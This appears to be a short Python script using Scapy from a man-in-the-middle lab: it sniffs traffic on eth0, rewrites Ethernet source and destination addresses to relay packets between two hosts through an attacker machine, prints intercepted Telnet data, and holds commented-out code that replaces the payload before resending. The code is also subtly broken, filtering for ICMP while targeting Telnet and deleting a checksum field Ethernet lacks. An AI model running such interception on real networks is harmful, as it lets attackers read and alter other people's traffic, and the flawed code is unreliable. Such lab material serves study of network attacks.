from scapy.all import *
from Hosts import Mac_Host_A, Mac_Host_B, Mac_Attacker

pkt_filter = "icmp"

def telnet_attack(pkt):
    if pkt.haslayer(Ether):
        if pkt[Ether].src == Mac_Host_A and  pkt[Ether].dst == Mac_Attacker:
            pkt[Ether].dst = Mac_Host_B
            pkt[Ether].src = Mac_Attacker
            
        elif pkt[Ether].src == Mac_Host_B and pkt[Ether].dst == Mac_Attacker :
            pkt[Ether].dst = Mac_Host_A
            pkt[Ether].src = Mac_Attacker
            print(pkt[Ether].src)
    
        del pkt[Ether].chksum
        
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):  
        telnet_data = pkt[Raw].load  
        
        print(f"Original Telnet Data: {telnet_data}")  
    pkt.show()

        # if telnet_data.strip():  # Modify only if there's meaningful data
        #     modified_payload = "z" * len(telnet_data)  # Replace all characters with "z"
            
        #     # Create a new packet with the modified payload
        #     new_pkt = pkt.copy()
        #     new_pkt[Raw].load = modified_payload

        #     # Delete checksum fields to force recalculation
        #     del new_pkt[IP].chksum
        #     del new_pkt[TCP].chksum

        #     # Force Scapy to recalculate checksums
        #     new_pkt = new_pkt.__class__(bytes(new_pkt))

        #     print(f"Modified Telnet Data: {new_pkt[Raw].load}")  # Debugging
        #     new_pkt.show()  # Show packet details
    
    send(pkt)

sniff(iface="eth0", filter = pkt_filter,prn=telnet_attack)